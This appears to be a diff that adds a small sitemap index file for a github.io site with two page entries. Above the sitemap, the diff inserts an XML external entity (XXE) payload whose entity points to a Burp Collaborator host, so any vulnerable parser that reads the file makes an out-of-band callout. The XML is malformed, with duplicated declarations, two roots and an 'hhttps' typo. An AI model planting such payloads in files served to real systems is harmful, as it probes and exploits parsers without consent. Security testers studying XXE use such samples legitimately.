@@ -1,0 +1,13 @@
+<!--?xml version="1.0" ?-->
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "2psijjbdrllckx0g6c93m2aogfm5au.burpcollaborator.net">]><foo>&xxe;</foo>
+<sitemapindex xmlns="http://www.google.com/schemas/sitemap/0.84">
+<sitemap>
+<loc>https://ddennis574.github.io/aa.html</loc>
+</sitemap>
+<sitemap>
+<loc>hhttps://ddennis574.github.io/aaa.html</loc>
+</sitemap>
+</sitemapindex>
